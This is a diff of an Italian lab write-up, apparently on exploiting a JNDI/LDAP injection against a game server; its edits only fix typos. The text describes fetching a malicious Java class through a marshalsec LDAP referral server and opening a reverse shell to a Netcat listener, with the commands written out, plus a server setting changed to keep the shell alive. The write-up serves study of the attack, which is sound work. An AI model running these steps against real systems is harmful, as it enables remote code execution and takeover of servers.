@@ -22,7 +22,7 @@ Non ci sono particolari complicanze in questa fase e questo messaggio può esser
 
 Una volta che la connessione LDAP è stabilita con l'attaccante, il server rigetterà la richiesta al server HTTP che userà la classe Java (precompilata) come response al server vittima.
 
-Il server vittima ricevuta la classe ne eseguirà il codice all'interno, nel nostro caso, come già anticipato, forzerà il server ad eseguire una nuova connessione TCP al server netcat aprendo una reverse shell con l'attaccante.
+Il server vittima ricevuta la classe ne eseguirà il codice all'interno, nel nostro caso, come già anticipato, forzerà il server ad eseguire una nuova connessione TCP al server Netcat aprendo una reverse shell con l'attaccante.
 
 A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante e potrà eseguire tutte le operazioni che vorrà, ad esempio installando un malware, creare persistenza, effettuare movimenti laterali ecc...
 
@@ -42,7 +42,7 @@ A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante
 
 **2)** Avvio del server LDAP tramite: 
 ```console
-java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <inidirizzo_attacante_serverHTTP>#<NomeClasseJavaMalevola> [<porta>]
+java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <indirizzo_attaccante_serverHTTP>#<NomeClasseJavaMalevola> [<porta>]
 ``` 
 **3)** Avvio del server http tramite:
 ```console
@@ -74,7 +74,7 @@ netcat -lnvp <porta>
 
 ---
 2. ${{\color{Goldenrod}{{\textbf{\textsf{Problematica:}}}}}}$ Successivamente all'esecuzione dell'iniezione e collegamento tramite reverse-shell, specialmente nella fase di collegamento il server vittima poteva chiudersi inaspettatamente.<br>
-    ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$ Tramite i file di log presenti nella cartella del server si è analizzato l'errore: "Server exete maxium -----", questo è dovuto al fatto che di default il server è configurato per avere un tempo (in tick di gioco) massimo di risposta di XXXXXXX tick. Essendo questo valore predefinito troppo basso, non dava il tempo di eseguire e mantenere la connessione al Netcat dell'attaccante. Si è proceduto così ad aumentare questo tempo e per fini pratici lo si è impostato a "-1" in modo da disattivarlo.[<sup>2</sup>](#2-questa-modificva-è-stata-effettuata-sul-file-serverproprities-contenente-la-configurazione-di-base-del-server-alla-riga-max-tick-si-è-sostiuito-il-valore-in--1)
+    ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$ Tramite i file di log presenti nella cartella del server si è analizzato l'errore: "Server exete maxium -----", questo è dovuto al fatto che di default il server è configurato per avere un tempo (in tick di gioco) massimo di risposta di XXXXXXX tick. Essendo questo valore predefinito troppo basso, non dava il tempo di eseguire e mantenere la connessione al Netcat dell'attaccante. Si è proceduto così ad aumentare questo tempo e per fini pratici lo si è impostato a "-1" in modo da disattivarlo.[<sup>2</sup>](#2-questa-modifica-è-stata-effettuata-sul-file-serverproperties-contenente-la-configurazione-di-base-del-server-alla-riga-max-tick-time-si-è-sostituito-il-valore-in--1)
 
 ---
 3. ${{\color{Goldenrod}{{\textbf{\textsf{Problematica:}}}}}}$ <br>
